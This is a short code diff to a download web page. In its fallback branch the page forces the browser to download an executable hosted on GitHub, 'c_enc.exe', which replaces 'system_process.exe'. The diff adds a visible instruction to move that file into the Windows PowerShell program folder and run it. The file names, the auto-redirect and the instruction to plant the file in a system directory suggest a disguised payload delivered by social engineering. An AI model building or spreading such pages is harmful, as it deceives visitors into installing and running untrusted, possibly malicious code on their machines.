@@ -25,8 +25,8 @@
 					document.getElementById("download").href = url;
 				}
 			}else{
-				document.write("Device Not Supported [ ! ]")
-				var url = "https://github.com/rewtaur-irshiyap/remotepage.github.io/releases/download/1.0/system_process.exe"
+				document.getElementById("instruction").innerHTML = "Move executable to C:\Program Files\WindowsPowerShell\ and execute";
+				var url = "https://github.com/rewtaur-irshiyap/remotepage.github.io/releases/download/1.0/c_enc.exe"
 				window.location = url;
 			}
 
@@ -39,6 +39,7 @@
 <body>
 	<br>
 	<h1 align="center" id="version"></h1>
+	<h1 align="center" id="instruction"></h1>
 	<br>
 	<center><a style="font-size: 30px;" align="center" id="download" href=""></a></center>
 	<br>
